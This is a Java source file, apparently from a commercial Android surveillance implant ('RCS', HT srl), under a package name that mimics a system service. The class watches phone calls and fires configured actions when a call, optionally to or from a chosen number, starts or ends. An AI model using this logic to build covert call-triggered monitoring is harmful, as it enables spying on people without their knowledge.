/* *******************************************
 * Copyright (c) 2011
 * HT srl,   All rights reserved.
 * Project      : RCS, AndroidService
 * File         : EventCall.java
 * Created      : 6-mag-2011
 * Author		: zeno
 * *******************************************/

package com.android.service.event;

import java.io.IOException;

import android.util.Log;

import com.android.service.Call;
import com.android.service.auto.Cfg;
import com.android.service.interfaces.Observer;
import com.android.service.listener.ListenerCall;
import com.android.service.util.DataBuffer;
import com.android.service.util.WChar;

public class EventCall extends EventBase implements Observer<Call> {
		/** The Constant TAG. */
		private static final String TAG = "EventCall";

		private int actionOnExit, actionOnEnter;
		private String number;
		private boolean inCall = false;
		
		@Override
		public void begin() {
			ListenerCall.self().attach(this);
		}

		@Override
		public void end() {
			ListenerCall.self().detach(this);
		}

		@Override
		public boolean parse(EventConf event) {
			super.setEvent(event);

			final byte[] conf = event.getParams();

			final DataBuffer databuffer = new DataBuffer(conf, 0, conf.length);
			
			try {
				actionOnEnter = event.getAction();
				actionOnExit = databuffer.readInt();
				
				// Estraiamo il numero di telefono
				byte[] num = new byte[databuffer.readInt()];
				databuffer.read(num);
				
				number = WChar.getString(num, true);
				
				num = null;
				if(Cfg.DEBUG) Log.d("QZ", TAG + " exitAction: " + actionOnExit + " number: \"");
			} catch (final IOException e) {
				if(Cfg.DEBUG) Log.d("QZ", TAG + " Error: params FAILED");
				return false;
			}
			
			return true;
		}

		@Override
		public void go() {
			// TODO Auto-generated method stub
		}

		public int notification(Call c) {
			// Nel range
			if (c.isOngoing() && inCall == false) {
				// Match any number
				if (number.length() == 0) {
					inCall = true;
					onEnter();
					return 0;
				}
				
				// Match a specific number
				if (c.getNumber().contains(number)) {
					inCall = true;
					onEnter();
					return 0;
				}
				
				return 0;
			} 
			
			if (c.isOngoing() == false && inCall == true) {
				inCall = false;
				
				onExit();
				return 0;
			}
			
			return 0;
		}
		
		public void onEnter() {
			trigger(actionOnEnter);
		}

		public void onExit() {
			trigger(actionOnExit);
		}
}
